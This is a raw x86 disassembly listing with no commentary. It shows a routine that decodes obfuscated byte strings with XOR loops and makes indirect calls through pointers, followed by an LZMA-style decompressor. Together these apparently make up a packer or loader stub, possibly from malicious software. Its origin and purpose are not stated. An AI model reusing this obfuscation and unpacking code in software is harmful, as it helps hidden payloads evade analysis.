  424c4c:	jne    0x424cc0
  424c4e:	jb     0x424cb5
  424c50:	outs   dx,BYTE PTR ds:[esi]
  424c51:	je     0x424c97
  424c53:	popa   
  424c54:	je     0x424cb7
  424c56:	pop    esp
  424c57:	dec    ebp
  424c58:	outs   dx,DWORD PTR ds:[esi]
  424c59:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  424c61:	ins    BYTE PTR es:[edi],dx
  424c62:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  424c69:	dec    esi
  424c6a:	gs ja  0x424c6d
  424c6d:	mov    edx,DWORD PTR [ebp-0x14]
  424c70:	sub    esp,0xe4
  424c76:	push   ebx
  424c77:	mov    eax,ebx
  424c79:	xchg   ecx,eax
  424c7a:	mov    eax,DWORD PTR [ebp+0x8]
  424c7d:	cmp    eax,0xf89c85b9
  424c82:	jne    0x425014
  424c88:	mov    eax,DWORD PTR [ebp+0xc]
  424c8b:	cmp    eax,0xf89c85b8
  424c90:	jne    0x425014
  424c96:	mov    eax,DWORD PTR [ebp+0x24]
  424c99:	mov    DWORD PTR [ebp-0x4],eax
  424c9c:	mov    BYTE PTR [ebp-0x18],0x3
  424ca0:	mov    BYTE PTR [ebp-0x17],0x1e
  424ca4:	mov    BYTE PTR [ebp-0x16],0x1
  424ca8:	mov    BYTE PTR [ebp-0x15],0x4f
  424cac:	mov    BYTE PTR [ebp-0x14],0x48
  424cb0:	mov    BYTE PTR [ebp-0x13],0x7a
  424cb4:	mov    BYTE PTR [ebp-0x20],0xd
  424cb8:	mov    BYTE PTR [ebp-0x1f],0xf
  424cbc:	mov    BYTE PTR [ebp-0x1e],0x1d
  424cc0:	mov    BYTE PTR [ebp-0x1d],0x8
  424cc4:	mov    BYTE PTR [ebp-0x1c],0x4f
  424cc8:	mov    BYTE PTR [ebp-0x1b],0x48
  424ccc:	mov    BYTE PTR [ebp-0x1a],0x7a
  424cd0:	mov    BYTE PTR [ebp-0x28],0xf
  424cd4:	mov    BYTE PTR [ebp-0x27],0x2
  424cd8:	push   esi
  424cd9:	mov    BYTE PTR [ebp-0x26],0x6
  424cdd:	mov    BYTE PTR [ebp-0x25],0xf3
  424ce1:	push   edi
  424ce2:	mov    BYTE PTR [ebp-0x24],0x19
  424ce6:	mov    BYTE PTR [ebp-0x23],0xa
  424cea:	push   0x73
  424cec:	mov    BYTE PTR [ebp-0x22],0x1
  424cf0:	xor    edi,edi
  424cf2:	mov    BYTE PTR [ebp-0x21],0x7a
  424cf6:	xor    esi,esi
  424cf8:	pop    edx
  424cf9:	mov    eax,0xf7
  424cfe:	lea    ecx,[ebp+esi*1-0x18]
  424d02:	movzx  ebx,BYTE PTR [ecx]
  424d05:	xor    ebx,edx
  424d07:	add    ebx,eax
  424d09:	inc    esi
  424d0a:	mov    BYTE PTR [ecx],bl
  424d0c:	cmp    esi,0x6
  424d0f:	jb     0x424cfe
  424d11:	xor    esi,esi
  424d13:	lea    ecx,[ebp+esi*1-0x20]
  424d17:	movzx  ebx,BYTE PTR [ecx]
  424d1a:	xor    ebx,edx
  424d1c:	add    ebx,eax
  424d1e:	inc    esi
  424d1f:	mov    BYTE PTR [ecx],bl
  424d21:	cmp    esi,0x7
  424d24:	jb     0x424d13
  424d26:	xor    esi,esi
  424d28:	lea    ecx,[ebp+esi*1-0x28]
  424d2c:	movzx  ebx,BYTE PTR [ecx]
  424d2f:	xor    ebx,edx
  424d31:	add    ebx,eax
  424d33:	push   0x8
  424d35:	mov    BYTE PTR [ecx],bl
  424d37:	inc    esi
  424d38:	pop    ecx
  424d39:	cmp    esi,ecx
  424d3b:	jb     0x424d28
  424d3d:	lea    eax,[ebp-0x2c]
  424d40:	mov    DWORD PTR [ebp-0x8],eax
  424d43:	mov    esi,DWORD PTR [ebp-0x8]
  424d46:	mov    eax,0x7113fcef
  424d4b:	mov    DWORD PTR [esi],eax
  424d4d:	mov    esi,DWORD PTR [ebp-0x2c]
  424d50:	cmp    esi,eax
  424d52:	jne    0x424d62
  424d54:	mov    DWORD PTR [ebp-0x8],0xf89c85b9
  424d5b:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  424d62:	mov    eax,DWORD PTR [ebp-0x4]
  424d65:	mov    eax,DWORD PTR [eax+0x18c]
  424d6b:	cmp    DWORD PTR [eax],edi
  424d6d:	jne    0x424fbd
  424d73:	mov    eax,DWORD PTR [ebp-0x4]
  424d76:	mov    eax,DWORD PTR [eax+0x17c]
  424d7c:	mov    DWORD PTR [eax],edi
  424d7e:	mov    eax,DWORD PTR [ebp-0x4]
  424d81:	mov    eax,DWORD PTR [eax+0x180]
  424d87:	mov    DWORD PTR [eax],edi
  424d89:	mov    edi,0x4e3c
  424d8e:	mov    eax,0x4f8f
  424d93:	mov    WORD PTR [ebp-0x78],ax
  424d97:	mov    eax,edi
  424d99:	mov    WORD PTR [ebp-0x76],ax
  424d9d:	add    eax,0x43
  424da0:	mov    WORD PTR [ebp-0x74],ax
  424da4:	lea    eax,[edi+0x3]
  424da7:	mov    WORD PTR [ebp-0x72],ax
  424dab:	mov    eax,0x4fac
  424db0:	mov    WORD PTR [ebp-0x70],ax
  424db4:	lea    eax,[edi-0x4]
  424db7:	mov    WORD PTR [ebp-0x6e],ax
  424dbb:	add    eax,0x45
  424dbe:	mov    WORD PTR [ebp-0x6c],ax
  424dc2:	lea    eax,[edi-0x2]
  424dc5:	mov    WORD PTR [ebp-0x6a],ax
  424dc9:	mov    eax,edi
  424dcb:	mov    WORD PTR [ebp-0x68],ax
  424dcf:	dec    eax
  424dd0:	mov    WORD PTR [ebp-0x66],ax
  424dd4:	mov    eax,0x99ff
  424dd9:	mov    WORD PTR [ebp-0x64],ax
  424ddd:	mov    eax,0x8288
  424de2:	mov    WORD PTR [ebp-0x62],ax
  424de6:	mov    eax,0xd78d
  424deb:	mov    WORD PTR [ebp-0x60],ax
  424def:	add    eax,0x1c
  424df2:	mov    WORD PTR [ebp-0x5e],ax
  424df6:	mov    eax,0x27aa
  424dfb:	mov    WORD PTR [ebp-0x5c],ax
  424dff:	mov    eax,0x47aa
  424e04:	mov    WORD PTR [ebp-0x5a],ax
  424e08:	lea    eax,[edi-0x3]
  424e0b:	mov    WORD PTR [ebp-0x58],ax
  424e0f:	mov    DWORD PTR [ebp-0x10],0xf306020f
  424e16:	mov    DWORD PTR [ebp-0xc],0x7a010a19
  424e1d:	lea    eax,[ebp-0x10]
  424e20:	mov    bl,BYTE PTR [eax]
  424e22:	xor    bl,dl
  424e24:	sub    bl,0x9
  424e27:	mov    BYTE PTR [eax],bl
  424e29:	inc    eax
  424e2a:	dec    ecx
  424e2b:	jne    0x424e20
  424e2d:	lea    eax,[ebp-0x10]
  424e30:	mov    DWORD PTR [ebp-0xb8],eax
  424e36:	lea    eax,[ebp-0xbc]
  424e3c:	push   eax
  424e3d:	mov    eax,DWORD PTR [ebp+0xc]
  424e40:	mov    ebx,0x7510899
  424e45:	xor    eax,ebx
  424e47:	mov    esi,0x3272e0
  424e4c:	add    eax,esi
  424e4e:	push   eax
  424e4f:	mov    eax,DWORD PTR [ebp-0x4]
  424e52:	add    eax,0x66
  424e55:	push   eax
  424e56:	mov    eax,DWORD PTR [ebp-0x4]
  424e59:	mov    eax,DWORD PTR [eax+0x198]
  424e5f:	mov    DWORD PTR [ebp-0xbc],0x1
  424e69:	push   DWORD PTR [eax]
  424e6b:	mov    eax,DWORD PTR [ebp+0x10]
  424e6e:	call   eax
  424e70:	mov    ecx,DWORD PTR [ebp+0x8]
  424e73:	xor    ecx,ebx
  424e75:	add    ecx,esi
  424e77:	mov    DWORD PTR [ebp-0x8],eax
  424e7a:	cmp    eax,ecx
  424e7c:	jne    0x424e97
  424e7e:	mov    eax,ds:0x33730bee
  424e83:	or     eax,0x22150bef
  424e88:	mov    ds:0x33730bee,eax
  424e8d:	add    eax,0x3372e90f
  424e92:	mov    ds:0x33730bee,eax
  424e97:	mov    ecx,0x4f84
  424e9c:	mov    eax,ecx
  424e9e:	mov    WORD PTR [ebp-0x40],ax
  424ea2:	mov    eax,0x4e71
  424ea7:	mov    edx,eax
  424ea9:	mov    WORD PTR [ebp-0x3e],dx
  424ead:	lea    edx,[ecx+0x15]
  424eb0:	mov    WORD PTR [ebp-0x3c],dx
  424eb4:	add    edx,0xfffffff8
  424eb7:	mov    WORD PTR [ebp-0x3a],dx
  424ebb:	lea    edx,[ecx+0xf]
  424ebe:	mov    WORD PTR [ebp-0x38],dx
  424ec2:	add    edx,0x1b
  424ec5:	mov    WORD PTR [ebp-0x36],dx
  424ec9:	lea    edx,[ecx+0x21]
  424ecc:	mov    WORD PTR [ebp-0x34],dx
  424ed0:	mov    WORD PTR [ebp-0x32],cx
  424ed4:	mov    ecx,edi
  424ed6:	mov    WORD PTR [ebp-0x30],cx
  424eda:	lea    ecx,[edx-0x1]
  424edd:	mov    edx,ecx
  424edf:	mov    WORD PTR [ebp-0x54],dx
  424ee3:	mov    edx,eax
  424ee5:	mov    WORD PTR [ebp-0x52],dx
  424ee9:	add    edx,0x8
  424eec:	mov    WORD PTR [ebp-0x50],dx
  424ef0:	mov    WORD PTR [ebp-0x4e],ax
  424ef4:	add    eax,0x2
  424ef7:	mov    WORD PTR [ebp-0x4c],ax
  424efb:	lea    eax,[ecx-0x16]
  424efe:	mov    WORD PTR [ebp-0x4a],ax
  424f02:	add    eax,0xfffffff7
  424f05:	mov    WORD PTR [ebp-0x48],ax
  424f09:	mov    WORD PTR [ebp-0x46],cx
  424f0d:	mov    WORD PTR [ebp-0x44],di
  424f11:	mov    eax,DWORD PTR [ebp+0x8]
  424f14:	movzx  ecx,WORD PTR [ebp-0x54]
  424f18:	xor    eax,ebx
  424f1a:	add    eax,esi
  424f1c:	xor    eax,ecx
  424f1e:	mov    WORD PTR [ebp-0x54],ax
  424f22:	mov    eax,DWORD PTR [ebp+0x8]
  424f25:	movzx  ecx,WORD PTR [ebp-0x40]
  424f29:	xor    eax,ebx
  424f2b:	add    eax,esi
  424f2d:	xor    eax,ecx
  424f2f:	mov    WORD PTR [ebp-0x40],ax
  424f33:	xor    eax,eax
  424f35:	mov    WORD PTR [ebp-0xd0],ax
  424f3c:	mov    WORD PTR [ebp-0xe4],ax
  424f43:	mov    edi,DWORD PTR [ebp+0x24]
  424f46:	lea    eax,[ebp-0xd0]
  424f4c:	lea    edx,[ebp-0x54]
  424f4f:	mov    DWORD PTR [ebp-0xbc],0x2
  424f59:	mov    DWORD PTR [ebp-0xb8],eax
  424f5f:	call   0x4278c8
  424f64:	mov    DWORD PTR [ebp-0xb4],eax
  424f6a:	lea    eax,[ebp-0xbc]
  424f70:	push   eax
  424f71:	mov    eax,DWORD PTR [ebp+0xc]
  424f74:	xor    eax,ebx
  424f76:	add    eax,esi
  424f78:	push   eax
  424f79:	lea    eax,[ebp-0x78]
  424f7c:	push   eax
  424f7d:	push   DWORD PTR [ebp-0x8]
  424f80:	mov    eax,DWORD PTR [ebp+0x10]
  424f83:	call   eax
  424f85:	mov    edi,DWORD PTR [ebp+0x24]
  424f88:	lea    eax,[ebp-0xe4]
  424f8e:	lea    edx,[ebp-0x40]
  424f91:	mov    DWORD PTR [ebp-0xb8],eax
  424f97:	call   0x4278c8
  424f9c:	mov    DWORD PTR [ebp-0xb4],eax
  424fa2:	lea    eax,[ebp-0xbc]
  424fa8:	push   eax
  424fa9:	mov    eax,DWORD PTR [ebp+0xc]
  424fac:	xor    eax,ebx
  424fae:	add    eax,esi
  424fb0:	push   eax
  424fb1:	lea    eax,[ebp-0x78]
  424fb4:	push   eax
  424fb5:	push   DWORD PTR [ebp-0x8]
  424fb8:	mov    eax,DWORD PTR [ebp+0x10]
  424fbb:	call   eax
  424fbd:	mov    eax,DWORD PTR [ebp+0x14]
  424fc0:	push   DWORD PTR [ebp-0x4]
  424fc3:	push   DWORD PTR [ebp+0x20]
  424fc6:	push   DWORD PTR [ebp+0x1c]
  424fc9:	push   DWORD PTR [ebp+0x18]
  424fcc:	push   DWORD PTR [ebp+0x10]
  424fcf:	push   DWORD PTR [ebp+0x8]
  424fd2:	push   DWORD PTR [ebp+0xc]
  424fd5:	call   0x42616c
  424fda:	add    DWORD PTR [ebp-0x4],eax
  424fdd:	mov    eax,DWORD PTR [ebp-0x4]
  424fe0:	mov    eax,DWORD PTR [ebp-0x4]
  424fe3:	mov    edi,DWORD PTR [eax+0x190]
  424fe9:	mov    eax,DWORD PTR [ebp-0x4]
  424fec:	mov    eax,DWORD PTR [eax+0x18c]
  424ff2:	mov    esi,DWORD PTR [eax]
  424ff4:	lea    ecx,[ebp+0x4]
  424ff7:	mov    edx,DWORD PTR [ecx]
  424ff9:	cmp    edx,esi
  424ffb:	jb     0x425012
  424ffd:	mov    eax,DWORD PTR [edi]
  424fff:	mov    edi,DWORD PTR [eax+0x3c]
  425002:	mov    edi,DWORD PTR [edi+eax*1+0x50]
  425006:	add    edi,esi
  425008:	cmp    edx,edi
  42500a:	jae    0x425012
  42500c:	sub    eax,esi
  42500e:	add    eax,edx
  425010:	mov    DWORD PTR [ecx],eax
  425012:	pop    edi
  425013:	pop    esi
  425014:	pop    ebx
  425015:	leave  
  425016:	ret    0x20
  425019:	push   edi
  42501a:	push   esi
  42501b:	push   ebx
  42501c:	push   ebp
  42501d:	mov    ebp,esp
  42501f:	mov    eax,DWORD PTR [ebp+0x24]
  425022:	add    DWORD PTR [ebp+0x28],eax
  425025:	push   eax
  425026:	cld    
  425027:	mov    esi,DWORD PTR [ebp+0x18]
  42502a:	add    DWORD PTR [ebp+0x1c],esi
  42502d:	push   esi
  42502e:	mov    esi,DWORD PTR [ebp+0x14]
  425031:	lods   eax,DWORD PTR ds:[esi]
  425032:	xchg   edx,eax
  425033:	push   edx
  425034:	mov    cl,BYTE PTR [esi-0x2]
  425037:	or     eax,0xffffffff
  42503a:	shl    eax,cl
  42503c:	not    eax
  42503e:	push   eax
  42503f:	mov    cl,dh
  425041:	or     eax,0xffffffff
  425044:	shl    eax,cl
  425046:	not    eax
  425048:	push   eax
  425049:	add    cl,dl
  42504b:	mov    edi,esi
  42504d:	sub    esp,0xc
  425050:	sub    eax,eax
  425052:	inc    eax
  425053:	push   eax
  425054:	push   eax
  425055:	push   eax
  425056:	push   eax
  425057:	push   eax
  425058:	push   edi
  425059:	sub    esi,esi
  42505b:	push   esi
  42505c:	or     ebx,0xffffffff
  42505f:	mov    eax,0x300
  425064:	shl    eax,cl
  425066:	lea    ecx,[eax+0x736]
  42506c:	mov    eax,0x4000400
  425071:	shr    ecx,1
  425073:	rep stos DWORD PTR es:[edi],eax
  425075:	push   0x5
  425077:	pop    ecx
  425078:	call   0x425363
  42507d:	loop   0x425078
  42507f:	lea    esi,[esi]
  425081:	lea    edi,[edi]
  425083:	mov    edi,DWORD PTR [ebp-0x4]
  425086:	mov    eax,DWORD PTR [ebp-0x10]
  425089:	sub    edi,DWORD PTR [ebp+0x24]
  42508c:	and    eax,edi
  42508e:	mov    DWORD PTR [ebp-0x18],eax
  425091:	mov    al,0x0
  425093:	call   0x42537b
  425098:	jne    0x425133
  42509e:	mov    cl,BYTE PTR [ebp-0xc]
  4250a1:	and    edi,DWORD PTR [ebp-0x14]
  4250a4:	shl    edi,cl
  4250a6:	sub    cl,0x8
  4250a9:	neg    cl
  4250ab:	shr    esi,cl
  4250ad:	pop    eax
  4250ae:	add    edi,esi
  4250b0:	pop    esi
  4250b1:	lea    edi,[edi+edi*2]
  4250b4:	shl    edi,0x8
  4250b7:	cmp    al,0x7
  4250b9:	pop    edx
  4250ba:	lea    ecx,[esi+edi*2+0xe6c]
  4250c1:	push   ecx
  4250c2:	push   esi
  4250c3:	mov    esi,0x100
  4250c8:	push   eax
  4250c9:	mov    al,0x1
  4250cb:	jb     0x425101
  4250cd:	mov    edi,DWORD PTR [ebp-0x4]
  4250d0:	sub    edi,DWORD PTR [ebp-0x24]
  4250d3:	movzx  edi,BYTE PTR [edi]
  4250d6:	mov    ebp,DWORD PTR [ebp-0x34]
  4250d9:	shl    edi,1
  4250db:	mov    ecx,esi
  4250dd:	and    esi,edi
  4250df:	add    ecx,esi
  4250e1:	lea    ebp,[ebp+ecx*2+0x0]
  4250e5:	call   0x42539a
  4250ea:	mov    ecx,eax
  4250ec:	shr    esi,0x8
  4250ef:	and    ecx,0x1
  4250f2:	cmp    esi,ecx
  4250f4:	mov    esi,0x100
  4250f9:	jne    0x425109
  4250fb:	cmp    eax,esi
  4250fd:	jb     0x4250d6
  4250ff:	jmp    0x425115
  425101:	mov    ebp,DWORD PTR [ebp-0x34]
  425104:	call   0x42539a
  425109:	inc    eax
  42510a:	inc    esi
  42510b:	sub    eax,0x1
  42510e:	sub    esi,0x1
  425111:	cmp    eax,esi
  425113:	jb     0x425101
  425115:	pop    edx
  425116:	inc    edx
  425117:	cmp    edx,0x5
  42511a:	dec    edx
  42511b:	mov    ecx,edx
  42511d:	jb     0x42512e
  42511f:	inc    edx
  425120:	cmp    edx,0xb
  425123:	dec    edx
  425124:	mov    cl,0x4
  425126:	dec    cl
  425128:	jb     0x42512e
  42512a:	mov    cl,0x7
  42512c:	dec    cl
  42512e:	sub    edx,ecx
  425130:	push   edx
  425131:	jmp    0x425182
  425133:	mov    al,0xc1
  425135:	dec    al
  425137:	call   0x42538b
  42513c:	jne    0x425152
  42513e:	pop    eax
  42513f:	pop    edi
  425140:	pop    edx
  425141:	pop    ecx
  425142:	pop    edx
  425143:	pop    ecx
  425144:	push   DWORD PTR [esp]
  425147:	push   ecx
  425148:	push   edx
  425149:	mov    edx,0x664
  42514e:	mov    cl,0x0
  425150:	jmp    0x4251c5
  425152:	mov    al,0xcd
  425154:	dec    al
  425156:	call   0x42538b
  42515b:	jne    0x42518b
  42515d:	mov    al,0xf1
  42515f:	dec    al
  425161:	call   0x42537b
  425166:	jne    0x4251bb
  425168:	pop    eax
  425169:	cmp    al,0x7
  42516b:	mov    al,0x9
  42516d:	jb     0x425171
  42516f:	mov    al,0xb
  425171:	push   eax
  425172:	mov    esi,DWORD PTR [ebp-0x4]
  425175:	sub    esi,DWORD PTR [ebp-0x24]
  425178:	cmp    esi,DWORD PTR [ebp+0x24]
  42517b:	jb     0x425352
  425181:	lods   al,BYTE PTR ds:[esi]
  425182:	mov    edi,DWORD PTR [ebp-0x4]
  425185:	stos   BYTE PTR es:[edi],al
  425186:	jmp    0x425319
  42518b:	mov    al,0xd8
  42518d:	call   0x42538b
  425192:	mov    esi,DWORD PTR [ebp-0x28]
  425195:	je     0x4251b2
  425197:	mov    al,0xe4
  425199:	call   0x42538b
  42519e:	mov    esi,DWORD PTR [ebp-0x2c]
  4251a1:	je     0x4251ac
  4251a3:	mov    esi,DWORD PTR [ebp-0x30]
  4251a6:	mov    ecx,DWORD PTR [ebp-0x2c]
  4251a9:	mov    DWORD PTR [ebp-0x30],ecx
  4251ac:	mov    ecx,DWORD PTR [ebp-0x28]
  4251af:	mov    DWORD PTR [ebp-0x2c],ecx
  4251b2:	mov    ecx,DWORD PTR [ebp-0x24]
  4251b5:	mov    DWORD PTR [ebp-0x28],ecx
  4251b8:	mov    DWORD PTR [ebp-0x24],esi
  4251bb:	pop    eax
  4251bc:	pop    edi
  4251bd:	pop    ecx
  4251be:	mov    edx,0xa68
  4251c3:	mov    cl,0x8
  4251c5:	add    edx,edi
  4251c7:	push   edx
  4251c8:	push   edi
  4251c9:	cmp    al,0x7
  4251cb:	mov    al,cl
  4251cd:	jb     0x4251d1
  4251cf:	add    al,0x3
  4251d1:	push   eax
  4251d2:	mov    ebp,DWORD PTR [ebp-0x34]
  4251d5:	call   0x425398
  4251da:	jne    0x4251f0
  4251dc:	mov    eax,DWORD PTR [ebp-0x18]
  4251df:	mov    edi,DWORD PTR [ebp-0x34]
  4251e2:	shl    eax,0x3
  4251e5:	sub    ecx,ecx
  4251e7:	push   0x8
  4251e9:	pop    esi
  4251ea:	lea    edi,[edi+eax*2+0x4]
  4251ee:	jmp    0x425225
  4251f0:	mov    ebp,DWORD PTR [ebp-0x34]
  4251f3:	add    ebp,0x2
  4251f6:	call   0x425398
  4251fb:	jne    0x425215
  4251fd:	mov    eax,DWORD PTR [ebp-0x18]
  425200:	mov    edi,DWORD PTR [ebp-0x34]
  425203:	shl    eax,0x3
  425206:	push   0x8
  425208:	pop    ecx
  425209:	push   0x8
  42520b:	pop    esi
  42520c:	lea    edi,[edi+eax*2+0x104]
  425213:	jmp    0x425225
  425215:	mov    edi,0x204
  42521a:	add    edi,DWORD PTR [ebp-0x34]
  42521d:	push   0x10
  42521f:	pop    ecx
  425220:	mov    esi,0x100
  425225:	mov    DWORD PTR [ebp-0x1c],ecx
  425228:	sub    eax,eax
  42522a:	inc    eax
  42522b:	mov    ebp,edi
  42522d:	call   0x42539a
  425232:	mov    ecx,eax
  425234:	sub    ecx,esi
  425236:	jb     0x42522b
  425238:	add    DWORD PTR [ebp-0x1c],ecx
  42523b:	cmp    DWORD PTR [ebp-0x3c],0x4
  42523f:	jae    0x4252f5
  425245:	add    DWORD PTR [ebp-0x3c],0x7
  425249:	mov    ecx,DWORD PTR [ebp-0x1c]
  42524c:	cmp    ecx,0x4
  42524f:	jb     0x425254
  425251:	push   0x3
  425253:	pop    ecx
  425254:	mov    edi,DWORD PTR [ebp-0x38]
  425257:	shl    ecx,0x6
  42525a:	sub    eax,eax
  42525c:	inc    eax
  42525d:	push   0x40
  42525f:	pop    esi
  425260:	lea    edi,[edi+ecx*2+0x360]
  425267:	mov    ebp,edi
  425269:	call   0x42539a
  42526e:	mov    ecx,eax
  425270:	sub    ecx,esi
  425272:	jb     0x425267
  425274:	mov    DWORD PTR [ebp-0x18],ecx
  425277:	mov    DWORD PTR [ebp-0x24],ecx
  42527a:	cmp    ecx,0x4
  42527d:	jb     0x4252f2
  42527f:	mov    esi,ecx
  425281:	and    DWORD PTR [ebp-0x24],0x1
  425285:	shr    esi,1
  425287:	or     DWORD PTR [ebp-0x24],0x2
  42528b:	dec    esi
  42528c:	cmp    ecx,0xe
  42528f:	jae    0x4252aa
  425291:	mov    eax,0x2af
  425296:	sub    eax,ecx
  425298:	mov    ecx,esi
  42529a:	shl    BYTE PTR [ebp-0x24],cl
  42529d:	add    eax,DWORD PTR [ebp-0x24]
  4252a0:	shl    eax,1
  4252a2:	add    eax,DWORD PTR [ebp-0x38]
  4252a5:	mov    DWORD PTR [ebp-0x34],eax
  4252a8:	jmp    0x4252d7
  4252aa:	sub    esi,0x4
  4252ad:	call   0x425357
  4252b2:	shr    ebx,1
  4252b4:	shl    DWORD PTR [ebp-0x24],1
  4252b7:	cmp    DWORD PTR [ebp-0x20],ebx
  4252ba:	jb     0x4252c2
  4252bc:	inc    DWORD PTR [ebp-0x24]
  4252bf:	sub    DWORD PTR [ebp-0x20],ebx
  4252c2:	dec    esi
  4252c3:	jne    0x4252ad
  4252c5:	mov    eax,0x644
  4252ca:	add    eax,DWORD PTR [ebp-0x38]
  4252cd:	mov    DWORD PTR [ebp-0x34],eax
  4252d0:	shl    DWORD PTR [ebp-0x24],0x4
  4252d4:	push   0x4
  4252d6:	pop    esi
  4252d7:	sub    edi,edi
  4252d9:	inc    edi
  4252da:	mov    eax,edi
  4252dc:	mov    ebp,DWORD PTR [ebp-0x34]
  4252df:	call   0x42539a
  4252e4:	test   al,0x1
  4252e6:	je     0x4252eb
  4252e8:	or     DWORD PTR [ebp-0x24],edi
  4252eb:	shl    edi,1
  4252ed:	dec    esi
  4252ee:	jne    0x4252dc
  4252f0:	jmp    0x4252f2
  4252f2:	inc    DWORD PTR [ebp-0x24]
  4252f5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4252f8:	add    ecx,0x2
  4252fb:	mov    edi,DWORD PTR [ebp-0x4]
  4252fe:	mov    eax,edi
  425300:	sub    eax,DWORD PTR [ebp+0x24]
  425303:	cmp    DWORD PTR [ebp-0x24],eax
  425306:	ja     0x425352
  425308:	mov    esi,edi
  42530a:	sub    esi,DWORD PTR [ebp-0x24]
  42530d:	mov    edx,DWORD PTR [ebp+0x28]
  425310:	lods   al,BYTE PTR ds:[esi]
  425311:	stos   BYTE PTR es:[edi],al
  425312:	cmp    edi,edx
  425314:	jae    0x425319
  425316:	dec    ecx
  425317:	jne    0x425310
  425319:	mov    DWORD PTR [ebp-0x4],edi
  42531c:	movzx  esi,al
  42531f:	cmp    edi,DWORD PTR [ebp+0x28]
  425322:	jb     0x425083
  425328:	call   0x425357
  42532d:	sub    eax,eax
  42532f:	lea    ebp,[esp+0x3c]
  425333:	mov    edx,DWORD PTR [ebp+0x20]
  425336:	mov    esi,DWORD PTR [ebp-0x8]
  425339:	sub    esi,DWORD PTR [ebp+0x18]
  42533c:	mov    DWORD PTR [edx],esi
  42533e:	mov    edx,DWORD PTR [ebp+0x2c]
  425341:	mov    edi,DWORD PTR [ebp-0x4]
  425344:	sub    edi,DWORD PTR [ebp+0x24]
  425347:	mov    DWORD PTR [edx],edi
  425349:	leave  
  42534a:	pop    ebx
  42534b:	pop    esi
  42534c:	pop    edi
  42534d:	ret    0x1c
  425350:	pop    esi
  425351:	pop    eax
  425352:	sub    eax,eax
  425354:	inc    eax
  425355:	jmp    0x42532f
  425357:	cmp    ebx,0x1000000
  42535d:	jb     0x425360
  42535f:	ret    
  425360:	shl    ebx,0x8
  425363:	push   esi
  425364:	mov    esi,DWORD PTR [ebp-0x8]
  425367:	cmp    esi,DWORD PTR [ebp+0x1c]
  42536a:	jae    0x425350
  42536c:	mov    eax,DWORD PTR [ebp-0x20]
  42536f:	shl    eax,0x8
  425372:	lods   al,BYTE PTR ds:[esi]
  425373:	mov    DWORD PTR [ebp-0x20],eax
  425376:	mov    DWORD PTR [ebp-0x8],esi
  425379:	pop    esi
  42537a:	ret    
  42537b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42537e:	movzx  eax,al
  425381:	shl    ecx,0x4
  425384:	add    eax,DWORD PTR [ebp-0x18]
  425387:	add    eax,ecx
  425389:	jmp    0x425391
  42538b:	movzx  eax,al
  42538e:	add    eax,DWORD PTR [ebp-0x3c]
  425391:	mov    ebp,DWORD PTR [ebp-0x38]
  425394:	lea    ebp,[ebp+eax*2+0x0]
  425398:	sub    eax,eax
  42539a:	lea    ebp,[ebp+eax*2+0x0]
  42539e:	cmp    ebx,0x1000000
  4253a4:	jae    0x4253c2
  4253a6:	mov    ecx,DWORD PTR [esp+0x38]
  4253aa:	shl    DWORD PTR [esp+0x20],0x8
  4253af:	cmp    ecx,DWORD PTR [esp+0x5c]
  4253b3:	jae    0x425351
  4253b5:	mov    dl,BYTE PTR [ecx]
  4253b7:	inc    DWORD PTR [esp+0x38]
  4253bb:	shl    ebx,0x8
  4253be:	mov    BYTE PTR [esp+0x20],dl
  4253c2:	mov    ecx,ebx
  4253c4:	movzx  edx,WORD PTR [ebp+0x0]
  4253c8:	shr    ecx,0xb
  4253cb:	imul   ecx,edx
  4253ce:	cmp    DWORD PTR [esp+0x20],ecx
  4253d2:	jae    0x4253eb
  4253d4:	mov    ebx,ecx
  4253d6:	mov    ecx,0x800
  4253db:	sub    ecx,edx
  4253dd:	shr    ecx,0x5
  4253e0:	add    WORD PTR [ebp+0x0],cx
  4253e4:	add    eax,eax
  4253e6:	lea    ebp,[esp+0x40]
  4253ea:	ret    
  4253eb:	shr    edx,0x5
  4253ee:	sub    DWORD PTR [esp+0x20],ecx
  4253f2:	sub    ebx,ecx
  4253f4:	sub    WORD PTR [ebp+0x0],dx
  4253f8:	add    eax,eax
  4253fa:	add    eax,0x1
  4253fd:	lea    ebp,[esp+0x40]
  425401:	ret    
  425402:	push   ebp
  425403:	mov    ebp,esp
  425405:	sub    esp,0x104
  42540b:	push   ebx
  42540c:	push   esi
  42540d:	push   edi
  42540e:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  425415:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  42541c:	mov    eax,DWORD PTR [ebp+0x8]
  42541f:	mov    DWORD PTR [ebp+0x8],eax
  425422:	mov    ecx,DWORD PTR [ebp-0x14]
  425425:	mov    ebx,0x7510899
  42542a:	xor    ecx,ebx
  42542c:	mov    eax,0x3272e0
  425431:	add    ecx,eax
  425433:	mov    DWORD PTR [ebp-0x28],ecx
  425436:	mov    ecx,DWORD PTR [ebp-0x14]
  425439:	xor    ecx,ebx
  42543b:	add    ecx,eax
  42543d:	mov    DWORD PTR [ebp-0x40],ecx
  425440:	mov    ecx,DWORD PTR [ebp-0x14]
  425443:	xor    ecx,ebx
  425445:	add    ecx,eax
  425447:	mov    DWORD PTR [ebp-0x3c],ecx
  42544a:	mov    ecx,DWORD PTR [ebp-0x14]
  42544d:	xor    ecx,ebx
  42544f:	add    ecx,eax
  425451:	mov    DWORD PTR [ebp-0xa0],ecx
  425457:	mov    DWORD PTR [ebp-0x50],0xf89f05b9
  42545e:	mov    DWORD PTR [ebp-0x3c],0xf89cb5b9
  425465:	mov    DWORD PTR [ebp-0x4c],0xf89c85bd
  42546c:	push   0x24
  42546e:	pop    ecx
  42546f:	mov    DWORD PTR [ebp-0x2c],ecx
  425472:	mov    DWORD PTR [ebp-0x2c],ecx
  425475:	push   0x64
  425477:	pop    ecx
  425478:	mov    DWORD PTR [ebp-0x2c],ecx
  42547b:	mov    DWORD PTR [ebp-0x2c],ecx
  42547e:	mov    DWORD PTR [ebp-0x2c],0x4c
  425485:	mov    DWORD PTR [ebp-0x2c],0x42
  42548c:	mov    ecx,DWORD PTR [ebp-0x14]
  42548f:	xor    ecx,ebx
  425491:	add    ecx,eax
  425493:	mov    DWORD PTR [ebp-0x2c],ecx
  425496:	mov    ecx,DWORD PTR [ebp-0x14]
  425499:	xor    ecx,ebx
  42549b:	add    ecx,eax
